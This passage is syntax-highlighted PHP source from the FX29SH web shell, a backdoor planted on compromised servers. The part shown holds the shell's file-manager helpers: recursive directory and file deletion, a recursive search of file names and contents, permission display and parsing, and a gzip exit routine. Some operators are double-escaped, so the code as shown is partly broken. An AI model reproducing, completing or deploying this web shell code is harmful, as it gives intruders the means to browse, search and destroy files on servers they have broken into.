      <span class="k">else</span> <span class="p">{</span><span class="nx">fs_rmdir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">);</span> <span class="nb">rmdir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="nb">closedir</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
  <span class="nb">rmdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
  <span class="k">return</span> <span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">fs_rmobj</span><span class="p">(</span><span class="nv">$o</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$o</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$o</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$o</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
    <span class="k">return</span> <span class="nx">fs_rmdir</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="k">return</span> <span class="nb">unlink</span><span class="p">(</span><span class="nv">$o</span><span class="p">);}</span>
  <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
<span class="p">}</span>
<span class="c1">###[ END FILESYSTEM FUNCTIONS ]###</span>
<span class="c1">###[ FX29SH EXIT FUNCTIONS ]###</span>
<span class="k">function</span> <span class="nf">fx29shexit</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">global</span> <span class="nv">$gzipencode</span><span class="p">,</span><span class="nv">$ft</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">headers_sent</span><span class="p">()</span> <span class="k">and</span> <span class="nv">$gzipencode</span> <span class="k">and</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$ft</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;img&quot;</span><span class="p">,</span><span class="s2">&quot;download&quot;</span><span class="p">,</span><span class="s2">&quot;notepad&quot;</span><span class="p">)))</span> <span class="p">{</span>
    <span class="nv">$v</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span>
    <span class="o">@</span><span class="nb">ob_end_clean</span><span class="p">();</span>
    <span class="o">@</span><span class="nb">ob_start</span><span class="p">(</span><span class="s2">&quot;ob_gzHandler&quot;</span><span class="p">);</span>
    <span class="k">echo</span> <span class="nv">$v</span><span class="p">;</span>
    <span class="o">@</span><span class="nb">ob_end_flush</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">###[ END OF FX29SH EXIT FUNCTIONS ]###</span>
<span class="k">function</span> <span class="nf">fx29fsearch</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">global</span> <span class="nv">$found</span><span class="p">,</span> <span class="nv">$found_d</span><span class="p">,</span> <span class="nv">$found_f</span><span class="p">,</span> <span class="nv">$search_i_f</span><span class="p">,</span> <span class="nv">$search_i_d</span><span class="p">,</span> <span class="nv">$a</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
  <span class="nv">$h</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
  <span class="k">while</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span> <span class="o">&amp;&amp;</span> <span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$bool</span> <span class="o">=</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;name_regexp&quot;</span><span class="p">])</span> <span class="k">and</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">])</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;name_regexp&quot;</span><span class="p">]</span> <span class="k">and</span> <span class="nb">ereg</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">],</span><span class="nv">$f</span><span class="p">));</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$search_i_d</span><span class="o">++</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">])</span> <span class="k">and</span> <span class="nv">$bool</span><span class="p">)</span> <span class="p">{</span><span class="nv">$found</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">;</span> <span class="nv">$found_d</span><span class="o">++</span><span class="p">;}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_link</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nx">fx29fsearch</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span> <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$search_i_f</span><span class="o">++</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$bool</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">]))</span> <span class="p">{</span>
            <span class="nv">$r</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text_wwo&quot;</span><span class="p">])</span> <span class="p">{</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="p">;}</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text_cs&quot;</span><span class="p">])</span> <span class="p">{</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">]);</span> <span class="nv">$r</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$r</span><span class="p">);}</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text_regexp&quot;</span><span class="p">])</span> <span class="p">{</span><span class="nv">$bool</span> <span class="o">=</span> <span class="nb">ereg</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">],</span><span class="nv">$r</span><span class="p">);}</span>
            <span class="k">else</span> <span class="p">{</span><span class="nv">$bool</span> <span class="o">=</span> <span class="nb">strpos</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$r</span><span class="p">,</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">],</span><span class="mi">1</span><span class="p">);}</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text_not&quot;</span><span class="p">])</span> <span class="p">{</span><span class="nv">$bool</span> <span class="o">=</span> <span class="o">!</span><span class="nv">$bool</span><span class="p">;}</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$bool</span><span class="p">)</span> <span class="p">{</span><span class="nv">$found</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">;</span> <span class="nv">$found_f</span><span class="o">++</span><span class="p">;}</span>
          <span class="p">}</span>
          <span class="k">else</span> <span class="p">{</span><span class="nv">$found</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">;</span> <span class="nv">$found_f</span><span class="o">++</span><span class="p">;}</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="nb">closedir</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">tabsort</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span><span class="nv">$b</span><span class="p">)</span> <span class="p">{</span> <span class="k">global</span> <span class="nv">$v</span><span class="p">;</span> <span class="k">return</span> <span class="nb">strnatcmp</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$v</span><span class="p">],</span> <span class="nv">$b</span><span class="p">[</span><span class="nv">$v</span><span class="p">]);}</span>
<span class="k">function</span> <span class="nf">view_perms_color</span><span class="p">(</span><span class="nv">$o</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;&amp;lt;font class=red&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_perms</span><span class="p">(</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;&amp;lt;font color=white&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_perms</span><span class="p">(</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;&amp;lt;font color=green&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_perms</span><span class="p">(</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">view_perms</span><span class="p">(</span><span class="nv">$mode</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;s&quot;</span><span class="p">;}</span>
  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;d&quot;</span><span class="p">;}</span>
  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;l&quot;</span><span class="p">;}</span>
  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;-&quot;</span><span class="p">;}</span>
  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;b&quot;</span><span class="p">;}</span>
  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;c&quot;</span><span class="p">;}</span>
  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;p&quot;</span><span class="p">;}</span>
  <span class="k">else</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;?&quot;</span><span class="p">;}</span>
  <span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;read&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00400</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;r&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
  <span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;write&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00200</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;w&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
  <span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00100</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;x&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
  <span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;read&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00040</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;r&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
  <span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;write&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00020</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;w&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
  <span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00010</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;x&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
  <span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;read&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00004</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;r&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
  <span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;write&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00002</span><span class="p">)</span><span class="o">?</span> <span class="s2">&quot;w&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
  <span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00001</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;x&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x800</span><span class="p">)</span> <span class="p">{</span><span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;x&quot;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;s&quot;</span><span class="o">:</span><span class="s2">&quot;S&quot;</span><span class="p">;}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x400</span><span class="p">)</span> <span class="p">{</span><span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;x&quot;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;s&quot;</span><span class="o">:</span><span class="s2">&quot;S&quot;</span><span class="p">;}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x200</span><span class="p">)</span> <span class="p">{</span><span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;x&quot;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;t&quot;</span><span class="o">:</span><span class="s2">&quot;T&quot;</span><span class="p">;}</span>
  <span class="k">return</span> <span class="nv">$type</span><span class="o">.</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$owner</span><span class="p">)</span><span class="o">.</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$group</span><span class="p">)</span><span class="o">.</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$world</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">parsesort</span><span class="p">(</span><span class="nv">$sort</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$one</span> <span class="o">=</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$sort</span><span class="p">);</span>
  <span class="nv">$second</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sort</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$second</span> <span class="o">!=</span> <span class="s2">&quot;d&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$second</span> <span class="o">=</span> <span class="s2">&quot;a&quot;</span><span class="p">;}</span>
  <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="nv">$one</span><span class="p">,</span><span class="nv">$second</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">parse_perms</span><span class="p">(</span><span class="nv">$mode</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;s&quot;</span><span class="p">;}</span>
  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;d&quot;</span><span class="p">;}</span>
  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;l&quot;</span><span class="p">;}</span>
  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;-&quot;</span><span class="p">;}</span>
  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;b&quot;</span><span class="p">;}</span>
  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;c&quot;</span><span class="p">;}</span>
  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;p&quot;</span><span class="p">;}</span>
  <span class="k">else</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;?&quot;</span><span class="p">;}</span>
  <span class="nv">$o</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00400</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$o</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00200</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$o</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00100</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span>
  <span class="nv">$g</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00040</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$g</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00020</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$g</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00010</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span>
  <span class="nv">$w</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00004</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$w</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00002</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$w</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00001</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;t&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$t</span><span class="p">,</span><span class="s2">&quot;o&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$o</span><span class="p">,</span><span class="s2">&quot;g&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$g</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$w</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">str2mini</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="nv">$len</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$len</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$len</span> <span class="o">=</span> <span class="nb">ceil</span><span class="p">(</span><span class="nv">$len</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span><span class="p">;</span>
    <span class="k">return</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="nv">$len</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;...&quot;</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="o">-</span><span class="nv">$len</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="nv">$content</span><span class="p">;</span> <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">strips</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$arr</span><span class="p">,</span><span class="nv">$k</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span>
